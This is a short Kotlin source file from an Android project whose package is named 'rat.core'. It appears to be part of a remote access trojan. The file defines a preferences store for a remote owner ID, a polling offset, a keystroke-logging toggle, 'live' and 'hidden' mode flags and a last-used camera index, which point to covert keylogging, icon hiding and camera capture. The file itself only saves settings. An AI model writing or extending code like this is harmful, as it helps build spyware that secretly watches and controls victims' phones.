package com.venice.rat.core

import android.content.Context

object Prefs {
    private const val F = "s"
    private fun sp(c: Context) = c.getSharedPreferences(F, Context.MODE_PRIVATE)

    fun owner(c: Context): Long = sp(c).getLong("o", Cfg.OWNER)
    fun setOwner(c: Context, id: Long) = sp(c).edit().putLong("o", id).apply()

    fun offset(c: Context): Long = sp(c).getLong("of", 0)
    fun setOffset(c: Context, v: Long) = sp(c).edit().putLong("of", v).apply()

    fun keyOn(c: Context): Boolean = sp(c).getBoolean("k", true)
    fun setKeyOn(c: Context, v: Boolean) = sp(c).edit().putBoolean("k", v).apply()

    fun live(c: Context): Boolean = sp(c).getBoolean("lv", false)
    fun setLive(c: Context, v: Boolean) = sp(c).edit().putBoolean("lv", v).apply()

    fun hidden(c: Context): Boolean = sp(c).getBoolean("h", false)
    fun setHidden(c: Context, v: Boolean) = sp(c).edit().putBoolean("h", v).apply()

    fun lastCam(c: Context): Int = sp(c).getInt("c", 0)
    fun setLastCam(c: Context, v: Int) = sp(c).edit().putInt("c", v).apply()
}
